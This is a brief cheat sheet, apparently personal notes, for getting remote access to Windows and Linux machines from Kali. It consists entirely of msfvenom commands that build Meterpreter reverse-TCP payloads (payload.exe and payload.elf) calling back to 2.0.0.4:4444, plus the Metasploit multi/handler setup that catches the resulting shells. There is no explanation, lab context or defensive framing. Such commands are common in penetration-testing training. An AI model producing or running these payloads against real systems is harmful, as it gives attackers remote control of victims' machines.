## For windows access from kali 
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=2.0.0.4 LPORT=4444 -f exe -o payload.exe

msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 2.0.0.4
set LPORT 4444
exploit
```

## For linux access from kali
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=2.0.0.4 LPORT=4444 -f elf -o payload.elf

msfconsole

use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 2.0.0.4
set LPORT 4444
exploit
```
